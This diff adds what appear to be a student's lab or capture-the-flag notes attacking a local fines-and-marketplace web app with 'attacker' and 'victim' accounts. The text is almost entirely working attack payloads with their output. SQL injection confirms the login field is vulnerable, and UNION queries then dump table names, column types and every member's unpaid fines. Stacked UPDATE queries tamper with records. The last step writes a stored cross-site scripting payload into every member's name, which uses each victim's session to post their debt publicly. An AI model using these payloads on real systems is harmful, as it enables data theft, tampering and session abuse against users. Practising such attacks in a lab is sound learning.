@@ -1,0 +1,339 @@
+1.
+
+get all data for attacker and victim
+
+Attacker
+4100001
+rahman-41
+anika.rahman
+market-Anika-41
+
+Victim
+4100002
+karim-41
+farhan.karim
+market-Farhan-41
+
+Normal login:
+
+Member	Total Outstanding
+Anika Rahman	$20.25
+
+-- test vulnerable with ' and '1'='1 and ' and '1'='0
+
+rahman-41' or '1'='1
+
+rahman-41' or '1'='0
+confirmed that password field is vulnerable
+
+2. how many columns are there in the table?
+
+valid upto: rahman-41' order by 4 limit 1 -- -
+
+so total 4 columns
+
+now see which are being printed:
+
+' union select 1,2,3,4 -- -
+
+Member	Total Outstanding
+2 3	$4.00
+
+so 2,3,4 are being printed, 1 is not being printed
+
+3. table and columns information extract
+
+' 
+union 
+select 
+    1,
+    '',
+    group_concat(table_name),
+    4 
+from information_schema.tables 
+    where table_schema = database() 
+-- -
+fine_record,log,member
+
+total 3 tables:
+
+for each one:
+get their column names->
+
+' 
+union 
+select 
+    1,
+    '',
+    group_concat(column_name),
+    4 
+from information_schema.columns 
+    where table_name = 'fine_record' 
+-- -
+=> amount,fine_id,member_id,reason,status
+' 
+union 
+select 
+    1,
+    '',
+    group_concat(column_name),
+    4 
+from information_schema.columns 
+    where table_name = 'member' 
+-- -
+=> first_name,last_name,member_id,pin
+' 
+union 
+select 
+    1,
+    '',
+    group_concat(column_name),
+    4 
+from information_schema.columns 
+    where table_name = 'log' 
+-- -
+=> attempted_at,id,submitted_id,submitted_secret
+
+' 
+union 
+select 
+    1,
+    '',
+    group_concat(distinct status),
+    4 
+from fine_record
+-- -
+=> PAID,UNPAID
+
+## DATA Type
+
+' 
+union 
+select 
+    1,
+    '',
+    group_concat(column_name, ' : ', data_type,'<br>'),
+    4 
+from information_schema.columns 
+    where table_name = 'fine_record' 
+-- -
+=> 
+amount : decimal
+fine_id : int
+member_id : int
+reason : varchar
+status : enum
+
+' 
+union 
+select 
+    1,
+    '',
+    group_concat(column_name, ' : ', data_type,'<br>'),
+    4 
+from information_schema.columns 
+    where table_name = 'member' 
+-- -
+
+first_name : varchar
+last_name : varchar
+member_id : int
+pin : varchar
+
+' 
+union 
+select 
+    1,
+    '',
+    group_concat(column_name, ' : ', data_type,'<br>'),
+    4 
+from information_schema.columns 
+    where table_name = 'log' 
+-- -
+
+attempted_at : timestamp
+id : int
+submitted_id : varchar
+submitted_secret : varchar
+
+
+'
+union
+select
+    1,
+    '',
+    group_concat(
+        member_id, ' ',first_name, ' ', last_name, ':',
+        ifnull((
+            select sum(amount) from fine_record where member_id = m.member_id and status = 'UNPAID'
+        ),0), '<br>'
+    ),
+    4
+from member m
+-- -
+
+4100001 Anika Rahman:20.25
+4100002 Farhan Karim:41.50
+4100003 Mehjabin Sultana:0.00
+4100004 Tahmid Hasan:22.65
+4100005 Nusrat Jahan:67.00
+4100006 Samin Hossain:10.00
+4100007 Afsana Kabir:0.00
+4100008 Rayhan Ahmed:24.00
+4100009 Tasnim Akter:14.00
+4100010 Adnan Mahmud:33.30
+4100011 Fariha Noor:6.75
+4100012 Abrar Siddique:48.90
+4100013 Lamisa Haque:0.00
+4100014 Zarif Uddin:40.00
+4100015 Maliha Khan:7.00
+
+alternate:
+
+=== doesnt work this following version for some reason
+'
+union
+select
+    1,
+    '',
+    group_concat(
+        m.member_id, ' ', m.first_name, ' ', m.last_name, ':',
+        coalesce(
+            sum(case when 
+                f.status='UNPAID' then f.amount 
+                else 0 
+            end),0
+        )
+    ),
+    4
+from member m left join fine_record f on m.member_id = f.member_id
+group by m.member_id, m.first_name, m.last_name
+-- -
+
+===working alternate:
+
+' 
+union 
+select 1,
+    '',
+    GROUP_CONCAT(t.member_id,', ',t.first_name,', ',t.last_name,' : $',t.total SEPARATOR '<br>')
+    ,4
+FROM (
+    SELECT m.member_id AS member_id, m.first_name AS first_name, m.last_name AS last_name,
+        COALESCE(
+            SUM(
+                CASE WHEN 
+                    f.status='UNPAID' THEN f.amount 
+                    ELSE 0 
+                END)
+            ,0
+            ) AS total
+FROM member m 
+    LEFT JOIN fine_record f 
+        ON f.member_id=m.member_id
+GROUP BY m.member_id, m.first_name, m.last_name
+) t -- -
+
+4.
+
+'; update member set last_name = '<b>Rah</b>' where member_id = 4100001; -- -
+Member	Total Outstanding
+Anika <b>Rahman</b>	$20.25
+
+5.
+
+from request tab:
+title	"hello"
+price	""
+
+await fetch("http://localhost:4001/list", {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-User": "?1",
+        "Priority": "u=0, i"
+    },
+    "referrer": "http://localhost:4001/",
+    "body": "title=hello&price=",
+    "method": "POST",
+    "mode": "cors"
+});
+
+clean up
+
+await fetch("http://localhost:4001/list", {
+    "credentials": "include",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+    },
+    "body": "title=hello&price=12",
+    "method": "POST",
+});
+
+title=>
+I owe <total> in fines
+price=>
+<total>
+
+total <- select sum(amount) from fine_record where member_id = m.member_id and status = 'UNPAID'
+
+rahman-41'; 
+update member m set last_name = concat(
+    '<script>
+    fetch
+    (
+        "http://localhost:4001/list", 
+        {
+            method: "POST",
+            headers: {
+                "content-type": "application/x-www-form-urlencoded"
+            },
+            credentials: "include",
+            body: "title=I+owe+',
+            (
+                select sum(amount) from fine_record where member_id = m.member_id and status = 'UNPAID'
+            ),
+            '+in+fines&price=',
+            (
+                select sum(amount) from fine_record where member_id = m.member_id and status = 'UNPAID'
+            ),'"
+        }
+    );
+    </script>'
+);
+-- -
+
+
+rahman-41'; 
+UPDATE member m SET last_name = CONCAT(
+    '<script>
+    fetch
+    (
+        "http://localhost:4001/list", 
+        {
+            method: "POST", 
+            headers: {
+                "content-type": "application/x-www-form-urlencoded"
+            }, 
+            credentials: "include", 
+            body: "title=I+owe+', 
+            (
+                select sum(amount) from fine_record where member_id = m.member_id AND status = 'UNPAID'
+            ), 
+            '+in+fines&price=', 
+            (
+                SELECT SUM(amount) FROM fine_record WHERE member_id = m.member_id AND status = 'UNPAID'
+            ),'"
+        }
+    );
+    </script>'
+) 
+; 
+-- -
